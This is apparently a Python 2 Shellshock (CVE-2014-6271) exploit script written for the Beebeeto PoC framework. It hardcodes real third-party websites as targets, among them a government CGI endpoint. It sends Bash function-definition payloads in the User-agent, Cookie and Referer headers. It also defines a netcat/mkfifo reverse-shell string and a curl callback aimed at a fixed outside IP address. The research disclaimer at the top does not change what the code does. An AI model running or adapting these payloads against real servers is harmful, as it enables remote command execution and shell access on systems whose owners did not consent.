#!/usr/bin/env python
# encoding:utf-8

import re
import random
import string
import requests
import pdb
import os
import urllib
import urllib2
import sys
import time
import codecs

import json
import traceback

from pprint import pprint
from optparse import OptionParser, OptionGroup

from utils import http

COUNT = 1

BEEBEETO_STATEMENT = \
    "This POC is created for security research. "\
    "It cannot be used in illegal ways, the user should be responsible for the usage of it."\
    "All Rights Reserved by BeeBeeTo.com."


class BaseFrame(object):
    poc_info = {
        # id/name to be edit by BeeBeeto
        'poc': {
            'id': None,
            'name': None,
            'author': 'Beebeeto',
            'create_date': '2014-07-15',
        },
        # to be edit by you
        'protocol': {
            'name': None,  # 'openssl' e.g.
            'port': None,  # must be int type, 443 e.g.
            'layer4_protocol': ['tcp'],
        },
        # to be edit by you
        'vul': {
            'app_name': None,
            'vul_version': None,
            'type': None,
            'tag': [],
            'desc': None,
            'references': [],
        },
    }

    def __init__(self, run_in_shell=True):

        if run_in_shell:
            self._init_parser()
        self.run_in_shell = run_in_shell

    def _init_parser(self, do_parse=True):
        usage = 'usage: %prog [options] arg1 arg2'
        self.base_parser = OptionParser(usage=usage, description=BEEBEETO_STATEMENT)
        self.user_parser = OptionGroup(self.base_parser,
                                       title='POC Specified Options',
                                       description='These options are specified by the author'
                                                   ' of this poc, so they are available'
                                                   ' only in this poc.')
        self.base_parser.add_option_group(self.user_parser)
        self.__init_base_parser()
        self._init_user_parser()

        if do_parse:
            (self.options, self.args) = self.base_parser.parse_args()
            # self.options.target = 'anchormediastudio.com'
            # self.options.target = 'www.evangelistadavidviera.com'
            self.options.target = 'http://www.grandleyenda.com'
            self.options.verbose = True
            if not self.options.target:
                print '\n[*] No target input!\n'
                self.base_parser.print_help()
                sys.exit()

    def __init_base_parser(self):
        # self.base_parser.add_option('-t', '--target', action='store', dest='target',
        self.base_parser.add_option('-t', '--target', action='store', dest='target',
                                    # default='anchormediastudio.com', help='the target to be checked by this poc.')
                                    default=None, help='the target to be checked by this poc.')
        self.base_parser.add_option('-v', '--verify',
                                    action='store_true', dest='verify', default=True,
                                    help='run poc in verify mode.')
        self.base_parser.add_option('-e', '--exploit',
                                    action='store_false', dest='verify',
                                    help='run poc in exploit mode.')
        self.base_parser.add_option('--verbose', action='store_true', dest='verbose',
                                    default=False, help='print verbose debug information.')
        self.base_parser.add_option('--info', action='callback', callback=self.__cb_print_poc_info,
                                    help='print poc information.')

    def _init_user_parser(self):
        #self.user_parser.add_option('-x', help='example')
        pass

    def __cb_print_poc_info(self, option, opt, value, parser):
        print(json.dumps(self.poc_info, ensure_ascii=False, indent=2))
        sys.exit()

    @classmethod
    def normalize_target(cls, target):
        if cls.poc_info['protocol']['name'] == 'http':
            return http.normalize_url(target)
        elif cls.poc_info['protocol']['name'] == 'https':
            return http.normalize_url(target, https=True)
        else:
            return target

    def run(self, options=None, debug=False):
        options = self.options.__dict__ if self.run_in_shell else options
        options['target'] = self.normalize_target(options['target'])
        args = {
            'options': options,
            'success': False,
            'poc_ret': {},
        }
        result = {}
        try:
            if options['verify']:
                args = self.verify(args)
            else:
                args = self.exploit(args)
            # print 'result:',  result
            # print 'args: ', args
            result.update(args)
        except Exception, err:
            if debug:
                traceback.print_exc()
                sys.exit()
            result.update(args)
            result['exception'] = str(err)
        return result

    @classmethod
    def verify(cls, args):
        '''
        main code here.
        '''
        return args

    @classmethod
    def exploit(cls, args):
        '''
        main code here.
        '''
        return args

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0032',
            'name': 'GNU Bash <= 4.3 Shockshell 破壳漏洞 POC',
            'author': 'Tommy',
            'create_date': '2015-02-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'bash',
            'vul_version': ['<=4.3'],
            'type': 'Command Execution',
            'tag': ['bash漏洞', 'CVE-2014-6271', 'ShellShock破壳漏洞', 'cgi'],
            'desc': '执行shell命令，从而导致信息泄漏、未授权的恶意修改、服务中断',
            'references': [
                'http://www.exploit-db.com/exploits/34765/',
                'http://blog.knownsec.com/2014/09/shellshock_response_profile/',
            ],
        },
    }


    '''
    GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，
    向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，
    以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。
    此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。
    这些变量可以包含代码，在Shell被调用后会被立即执行。
    '''

    @classmethod
    def verify(cls, args):
        # args['options']['target'] = 'https://www.ovh.com/cgi-bin/newOrder/order.cgi'
        args['options']['verbose'] = True
        # args['options']['target'] = '
        args['options']['target'] = 'http://www.rzp.cz/cgi-bin/aps_cacheWEB.sh?VSS_SERV=ZVWSBJFND'
        # args['options']['target'] = 'http://www.fabricshack.com/cgi-bin/Store/store.cgi'
        # args['options']['target'] = 'http://niopub.nio.org/cgi-bin/oceanl/oceanl.sh'
	ip =  args['options']['target']
	opener = urllib2.build_opener()
        remote = '46.101.51.58'
        port = '8080'
        # reverse_shell="() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" % (remote, port)
        # reverse_shell="() { ignored;};/bin/bash -c '/bin/ls /tmp;:'"
        reverse_shell="() { ignored;};/bin/bash -c '/usr/bin/curl 46.101.51.58 ;:'"

	# Modify User-agent header value for Shell Shock test
	opener.addheaders = [
                # ('User-agent', '() { :; }; echo Content-Type: text/plain; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
                ('User-agent', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
                ('Cookie', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
                ('Referer', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
                # ('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'),

                # ('User-agent', '() { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
                # ('User-agent', 'slll; () { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"; /bin/ls /tmp '),
                # ('User-agent', 'slll; () { :; }; echo "1a8b8e54b53f63a8efae84e064373f19:"; /bin/ls /tmp '),
                # ('User-agent', '() { :;}; echo "this is a test:"; /bin/ls /tmp && echo ":"; echo "test:"'),
               # ('User-agent', reverse_shell),
                # ('User-agent', "() { :; }; /bin/bash -c '/bin/ls /bin'"),
                # ('User-agent', "() { :; }; /bin/bash -c 'echo test'"),
                # ('User-agent', "() { :; }; echo \"test\""),
                # ('Cookie', reverse_shell),
				('Accept','text/plain'),
				('Content-type','application/x-www-form-urlencoded'),
				('Referer','http://www.baidu.com')
				]
	try:
            URL = ip
            if args['options']['verbose']:
                print 'requesting ', URL
            response = opener.open(URL)
            headers = response.info()
            print '\n' + '*' * 80
            print response.getcode()
            print '*' * 80
            # print 'test'
            # print response
            # print dict(response)
            print headers
            print '\n' + '*' * 80
            status = response.getcode()
            opener.close()
            if status==200:
                if "1a8b8e54b53f63a8efae84e064373f19" in headers:
                    args['success'] = True
                    args['poc_ret']['vul_url'] = URL
                else:
                    args['success'] = False
            return args

	except Exception as e:
            print 'meet error', e
            opener.close()
            args['success'] = False
            return args

    exploit = verify



if __name__ == '__main__':
    os.system('clear')
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
